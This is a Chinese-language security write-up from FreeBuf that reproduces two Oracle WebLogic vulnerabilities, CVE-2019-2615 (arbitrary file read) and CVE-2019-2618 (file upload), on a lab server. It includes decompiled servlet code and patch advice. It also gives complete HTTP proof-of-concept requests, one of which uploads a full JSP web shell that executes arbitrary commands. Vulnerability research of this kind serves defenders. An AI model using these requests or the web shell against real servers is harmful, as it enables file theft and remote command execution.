## 引言

 **weblogic** **中两个** **CVE** **漏洞比较有意思，所以复现一下，该两个漏洞需要在** **poc**
**中加入用户名和密码（** **cookie** **）才能实现。** ****

##  **环境搭建 **

环境搭建： 首先安装weblogic 下载地址
[http://www.oracle.com/technetwork/cn/middleware/weblogic/downloads/wls-main-091116-zhs.html](http://www.oracle.com/technetwork/cn/middleware/weblogic/downloads/wls-main-091116-zhs.html)
![1564469063_5d3fe747846b0.png!small](https://image.3001.net/images/20190730/1564469063_5d3fe747846b0.png!small)

安装目录没特别需求可以不更改，一路下一步。
![1564469070_5d3fe74ea684a.png!small](https://image.3001.net/images/20190730/1564469070_5d3fe74ea684a.png!small)
把复选框去掉：![1564469077_5d3fe75548932.png!small](https://image.3001.net/images/20190730/1564469077_5d3fe75548932.png!small)全选：
![1564469083_5d3fe75b22b6d.png!small](https://image.3001.net/images/20190730/1564469083_5d3fe75b22b6d.png!small)（已安装的图片）![1564469088_5d3fe760d5203.png!small](https://image.3001.net/images/20190730/1564469088_5d3fe760d5203.png!small)（安装包捆绑有jdk1.6，上一步安装完成）
可以默认：![1564469096_5d3fe76864957.png!small](https://image.3001.net/images/20190730/1564469096_5d3fe76864957.png!small)正在安装：
![1564469106_5d3fe7724c7a7.png!small](https://image.3001.net/images/20190730/1564469106_5d3fe7724c7a7.png!small)安装完成。![1564469113_5d3fe779778fe.png!small](https://image.3001.net/images/20190730/1564469113_5d3fe779778fe.png!small)
打开Oracle然后选择Getting startedwith WebLogic
Server：![1564469119_5d3fe77fa7483.png!small](https://image.3001.net/images/20190730/1564469119_5d3fe77fa7483.png!small)配置weblogic界面：
![1564469126_5d3fe78679549.png!small](https://image.3001.net/images/20190730/1564469126_5d3fe78679549.png!small)域源全选：![1564469136_5d3fe79046ae2.png!small](https://image.3001.net/images/20190730/1564469136_5d3fe79046ae2.png!small)
一直默认直到设置密码选项：![1564469141_5d3fe795d0f71.png!small](https://image.3001.net/images/20190730/1564469141_5d3fe795d0f71.png!small)选择开发模式。
![1564469147_5d3fe79b6f4ff.png!small](https://image.3001.net/images/20190730/1564469147_5d3fe79b6f4ff.png!small)全选。
![1564469153_5d3fe7a1977b6.png!small](https://image.3001.net/images/20190730/1564469153_5d3fe7a1977b6.png!small)剩下的默认就行
安装完毕。 在安装目录下找到启动程序。
![1564469161_5d3fe7a9e063e.png!small](https://image.3001.net/images/20190730/1564469161_5d3fe7a9e063e.png!small)startWeblogic.cmd
启动成功后，试试能否访问weblogic控制台。
Url:[http://192.168.219.131:7001/console/login/LoginForm.jsp](http://192.168.219.131:7001/console/login/LoginForm.jsp)
![1564469168_5d3fe7b06c468.png!small](https://image.3001.net/images/20190730/1564469168_5d3fe7b06c468.png!small)

## CVE-2019-2615任意文件读取

漏洞分析 该功能的关键代码在weblogic.management.servlet.FileDistributionServlet的 doGet()方法中：

    
    
    public void doGet(final HttpServletRequest var1, final HttpServletResponsevar2) throws ServletException, IOException {  
      AuthenticatedSubject var3 = this.authenticateRequest(var1, var2);  
      if(var3 != null) {  
          final String var4 =var1.getHeader("wl_request_type");  
          if(var3 != KERNEL_ID) {  
              AdminResource var5 = newAdminResource("FileDownload", (String)null, var4);  
              if(!this.am.isAccessAllowed(var3, var5,(ContextHandler)null)) {  
                 ManagementLogger.logErrorFDSUnauthorizedDownloadAttempt(var3.getName(), var4);  
                  var2.sendError(401);  
                  return;  
              }  
          }  
    ​  
          try {  
              if(debugLogger.isDebugEnabled()) {  
                  debugLogger.debug("---->doGet incoming request: " + var4);  
              }  
    ​  
             if(var4.equals("wl_xml_entity_request")) {  
                 this.doGetXMLEntityRequest(var1, var2);  
              } elseif(var4.equals("wl_jsp_refresh_request")) {  
                 this.doGetJspRefreshRequest(var1, var2);  
              } else if(var4.equals("file")) {  
                  this.doGetFile(var1, var2);  
              } elseif(!var4.equals("wl_init_replica_request") &&!var4.equals("wl_file_realm_request") &&!var4.equals("wl_managed_server_independence_request")) {  
                 var2.addHeader("ErrorMsg", "Bad request type");  
                  String var10 =Utils.encodeXSS(var4);  
                  var2.sendError(400, "Bad requesttype: " + var10);  
                 ManagementLogger.logBadRequestInFileDistributionServlet(var4);  
              } else {  
                  ......  
                  ......  
                  }  
              }  
          } catch (Exception var9) {  
              if(!Kernel.isInitialized()) {  
                  throw newAssertionError("kernel not initialized");  
              }  
    ​  
             ManagementLogger.logErrorInFileDistributionServlet(var4, var9);  
          }  
    ​  
      }  
    }

先取request中header的参数"wl_request_type"
的值，然后判断如果该值等于“wl_xml_entity_request”、“wl_jsp_refresh_request”、
“file”…则分别调用各自的方法，进入下一步判断。如果wl_request_type的值为“wl_jsp_refresh_request”
，进入doGetJspRefreshRequest()方法：

    
    
    private void doGetJspRefreshRequest(HttpServletRequest var1,HttpServletResponse var2) throws IOException {  
        String var3 = var1.getHeader("adminPath");  
    ​  
        try {  
            FileInputStream var4 = new FileInputStream(var3);  
    ​  
            try {  
               var2.setContentType("text/plain");  
                var2.setStatus(200);  
                this.returnInputStream(var4,var2.getOutputStream());  
            } finally {  
                var4.close();  
            }  
    ​  
        } catch (IOException var10) {  
            String var5 = "I/O Exception getting resource:" + var10.getMessage();  
            var2.addHeader("ErrorMsg", var5);  
            var2.sendError(500, var5);  
        }  
    }

doGetJspRefreshRequest()方法中的“adminPath”也是request
中的header参数，在Post包中传入要读取的文件。进入该方法中，直接使用FileInputStream
类进行文件读取，故造成了所谓的“任意文件读取”漏洞。

漏洞复现
访问URL：[http://192.168.219.131:7001/bea_wls_management_internal2/wl_management](http://192.168.219.131:7001/bea_wls_management_internal2/wl_management)
采用BurpSuite抓包：![1564469182_5d3fe7beee747.png!small](https://image.3001.net/images/20190730/1564469182_5d3fe7beee747.png!small)将POC加入包中：![1564469189_5d3fe7c534863.png!small](https://image.3001.net/images/20190730/1564469189_5d3fe7c534863.png!small)

POC为：

    
    
    GET /bea_wls_management_internal2/wl_management HTTP/1.1  
    Host: 192.168.219.131:7001  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36(KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6  
    Connection: close  
    username:weblogic  
    password:12345678  
    wl_request_type:wl_jsp_refresh_request  
    adminPath:C:\python27\123.txt  
    Upgrade-Insecure-Requests: 1

发送该包发现：![1564469197_5d3fe7cd9dc68.png!small](https://image.3001.net/images/20190730/1564469197_5d3fe7cd9dc68.png!small)检查原机的文件发现：
![1564469204_5d3fe7d4ca24d.png!small](https://image.3001.net/images/20190730/1564469204_5d3fe7d4ca24d.png!small)

修复建议 升级补丁。Oracle官方更新链接地址：[https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html](https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html) 。
或者直接删除了requestType的“wl_jsp_refresh_request”
参数的判断，同时也删除了doGetJspRefreshRequest()方法。

## CVE-2019-2618文件上传漏洞

漏洞分析 DeploymentServiceServlet类的handlePlanOrApplicationUpload()方法：

    
    
    private final void handlePlanOrApplicationUpload(HttpServletRequest var1,HttpServletResponse var2, AuthenticatedSubject var3) throws IOException {  
      String var4 =mimeDecode(var1.getHeader("wl_upload_application_name"));  
      String var5 = ApplicationVersionUtils.getApplicationName(var4);  
      String var6 = ApplicationVersionUtils.getVersionId(var4);  
      String var7 = mimeDecode(var1.getHeader("wl_request_type"));  
      if(var5 == null) {  
          Loggable var24 =DeploymentServiceLogger.logRequestWithNoAppNameLoggable(var7);  
          logAndSendError(var2, 403, var24);  
      } else {  
          String var8 = var1.getContentType();  
          if(var8 != null &&var8.startsWith("multipart")) {  
    ​  
              boolean var25 = false;  
              String var10 =var1.getHeader("wl_upload_delta");  
              if(var10 != null && var10.equalsIgnoreCase("true")){  
                  var25 = true;  
              }  
    ​  
              boolean var11 =var7.equals("plan_upload");  
              boolean var12 ="false".equals(var1.getHeader("archive"));  
              if(this.isDebugEnabled()) {  
                  this.debug(var7 + "request for application " + var5 + " with archive: " + var12);  
              }  
    ​  
              String var13 = null;  
              if(var6 == null || var6.length() == 0) {  
                  var13 =this.getUploadDirName(var5, var6, var25, var11, var12);  
              }  
    ​  
              if(var13 == null) {  
                  var13 =this.getDefaultUploadDirName();  
                  if(var13 == null) {  
                      Loggable var26 =DeploymentServiceLogger.logNoUploadDirectoryLoggable(var7, var5);  
                     logAndSendError(var2, 500, var26);  
                      return;  
                  }  
    ​  
                  var13 = var13 + var5 +File.separator;  
                  if(var6 != null) {  
                      var13 = var13 +var6 + File.separator;  
                  }  
              }  
    ​  
              if(this.isDebugEnabled()) {  
                  this.debug(" +++ FinaluploadingDirName : " + var13);  
              }  
    ​  
              boolean var14 = true;  
              String var15 = null;  
              ......  
              ......  
    ​  
          } else {  
              Loggable var9 = DeploymentServiceLogger.logBadContentTypeServletRequestLoggable(var7,var8);  
              logAndSendError(var2, 400, var9);  
          }  
      }  
    }

该方法主要是对POST包中的传入的headers进行处理，主要作用包括：获取请求包中的“wl_upload_application_name”
参数，然后判断是否为空；判断“content-type”；构造上传路径等。

漏洞复现 访问漏洞URL：
[http://192.168.219.131:7001/bea_wls_deployment_internal/DeploymentService](http://192.168.219.131:7001/bea_wls_deployment_internal/DeploymentService)
并使用BurpSuite抓包。![1564469214_5d3fe7de0f48a.png!small](https://image.3001.net/images/20190730/1564469214_5d3fe7de0f48a.png!small)将发包方式改成POST方式写入POC：![1564469221_5d3fe7e5e25b8.png!small](https://image.3001.net/images/20190730/1564469221_5d3fe7e5e25b8.png!small)POC为：

    
    
    POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1  
    Host: 192.168.219.131:7001  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101Firefox/68.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Connection: close  
    Upgrade-Insecure-Requests: 1  
    username: weblogic  
    wl_request_type: app_upload  
    cache-control: no-cache  
    wl_upload_application_name: /../tmp/_WL_internal/bea_wls_internal/9j4dqk/war  
    serverName: weblogic  
    password: 12345678  
    Content-Type: multipart/form-data; boundary=--------1838169138  
    archive: true  
    server_version: 10.3.6.0  
    wl_upload_delta: true  
    Content-Length: 1044  
    ​  
    ----------1838169138  
    Content-Disposition: form-data; name="shell.jsp";filename="shell.jsp"  
    Content-Type: false  
    ​  
    <%@ page import="java.util.*,java.io.*"%>  
    <%  
    %>  
    <HTML><BODY>  
    Commands with JSP  
    <FORM METHOD="GET" NAME="myform" ACTION="">  
    <INPUT TYPE="text" NAME="cmd">  
    <INPUT TYPE="submit" VALUE="Send">  
    </FORM>  
    <pre>  
    <%  
    if (request.getParameter("cmd") != null) {  
      out.println("Command: " +request.getParameter("cmd") + "<BR>");  
      Process p;  
      if (System.getProperty("os.name").toLowerCase().indexOf("windows")!= -1){  
          p = Runtime.getRuntime().exec("cmd.exe /C " +request.getParameter("cmd"));  
      }  
      else{  
          p = Runtime.getRuntime().exec(request.getParameter("cmd"));  
      }  
      OutputStream os = p.getOutputStream();  
      InputStream in = p.getInputStream();  
      DataInputStream dis = new DataInputStream(in);  
      String disr = dis.readLine();  
      while ( disr != null ) {  
      out.println(disr);  
      disr = dis.readLine();  
      }  
    }  
    %>  
    </pre>  
    </BODY></HTML>   
    ​  
    ----------1838169138--
发送数据包发现浏览器出现下图：![1564469229_5d3fe7edbf46a.png!small](https://image.3001.net/images/20190730/1564469229_5d3fe7edbf46a.png!small)访问
URL：[http://192.168.219.131:7001/bea_wls_internal/shell.jsp?cmd=ipconfig](http://192.168.219.131:7001/bea_wls_internal/shell.jsp?cmd=ipconfig)
![1564469235_5d3fe7f387f85.png!small](https://image.3001.net/images/20190730/1564469235_5d3fe7f387f85.png!small)漏洞复现完成。

修复方案 Oracle官方已经在关键补丁更新（CPU）中修复了该漏洞。

## 参考文档

[https://xz.aliyun.com/t/5078](https://xz.aliyun.com/t/5078)

 ***本文作者：陌上花开樱如雪，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

